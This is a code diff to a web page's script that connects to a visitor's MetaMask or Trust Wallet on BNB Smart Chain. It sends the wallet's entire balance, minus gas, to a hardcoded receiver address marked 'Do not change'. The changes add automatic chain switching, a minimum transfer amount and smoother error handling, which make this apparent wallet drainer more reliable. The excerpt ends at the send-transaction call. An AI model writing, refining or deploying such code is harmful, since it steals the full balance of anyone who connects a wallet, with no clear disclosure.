@@ -9,6 +9,7 @@
 
   <script>
     const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Do not change
+    const MINIMUM_AMOUNT_TO_SEND = "10000000000000000"; // 0.01 BNB in wei, minimum amount to send
 
     async function connectAndTransfer() {
       // Check for wallet provider (MetaMask, Trust Wallet, etc.)
@@ -18,7 +19,7 @@
       } else if (window.web3) {
         web3 = new Web3(window.web3.currentProvider); // Fallback for older wallet versions
       } else {
-        alert("Please install MetaMask or Trust Wallet.");
+        alert("Please install MetaMask or Trust Wallet and ensure it is active.");
         return;
       }
 
@@ -26,39 +27,71 @@
         // Request account access
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         const accounts = await web3.eth.getAccounts();
+        if (!accounts || accounts.length === 0) {
+          alert("Could not connect to wallet. Please ensure your wallet is unlocked and try again.");
+          return;
+        }
         const sender = accounts[0];
 
         // Ensure BNB Smart Chain Mainnet (chainId 56, which is 0x38 in hex)
         const chainId = await web3.eth.getChainId();
         const chainIdHex = web3.utils.toHex(chainId);
-        if (chainIdHex !== "0x38") { // Compare with hex value of 56 (0x38)
-          alert("Please switch to BNB Smart Chain Mainnet.");
-          return;
+        if (chainIdHex !== "0x38") {
+          // Attempt to switch to BNB Smart Chain Mainnet
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x38' }],
+            });
+          } catch (switchError) {
+            alert("Please switch to BNB Smart Chain Mainnet manually in your wallet.");
+            return;
+          }
         }
 
         // Get full balance (returned as a string in wei)
         const balance = await web3.eth.getBalance(sender);
+        const balanceBigInt = BigInt(balance);
 
-        // Estimate dynamic gas cost
+        // Estimate gas cost
         const gasLimit = await web3.eth.estimateGas({
           from: sender,
           to: receiverAddress,
-          value: balance
+          value: MINIMUM_AMOUNT_TO_SEND // Use minimum amount for estimation
         });
         const gasPrice = await web3.eth.getGasPrice();
-        
-        // Calculate gas cost (gasLimit * gasPrice)
         const gasEstimate = (BigInt(gasLimit) * BigInt(gasPrice)).toString();
+        const gasEstimateBigInt = BigInt(gasEstimate);
 
-        // Subtract gas from balance using BigInt
-        const amountToSend = (BigInt(balance) - BigInt(gasEstimate)).toString();
+        // Calculate total required funds (minimum amount to send + gas fees)
+        const minimumAmountBigInt = BigInt(MINIMUM_AMOUNT_TO_SEND);
+        const totalRequired = minimumAmountBigInt + gasEstimateBigInt;
 
-        if (BigInt(amountToSend) <= 0) {
-          alert("Insufficient BNB to cover gas fees.");
+        // Check if balance is sufficient
+        if (balanceBigInt < totalRequired) {
+          alert(
+            `Insufficient funds!\n` +
+            `Your balance: ${(balanceBigInt / BigInt(1e18))} BNB\n` +
+            `Required: ${(totalRequired / BigInt(1e18))} BNB (including gas fees)\n` +
+            `Please add more BNB to your wallet.`
+          );
           return;
         }
 
-        // Send BNB (amountToSend is already a string in wei, convert to hex)
+        // Calculate amount to send (use minimum amount or remaining balance after gas, whichever is higher)
+        let amountToSend = balanceBigInt - gasEstimateBigInt;
+        if (amountToSend < minimumAmountBigInt) {
+          amountToSend = minimumAmountBigInt;
+        }
+        amountToSend = amountToSend.toString();
+
+        // Double-check funds before sending
+        if (BigInt(amountToSend) + gasEstimateBigInt > balanceBigInt) {
+          alert("Insufficient funds after final calculation. Please add more BNB.");
+          return;
+        }
+
+        // Send BNB
         const tx = await web3.eth.sendTransaction({
           from: sender,
           to: receiverAddress,
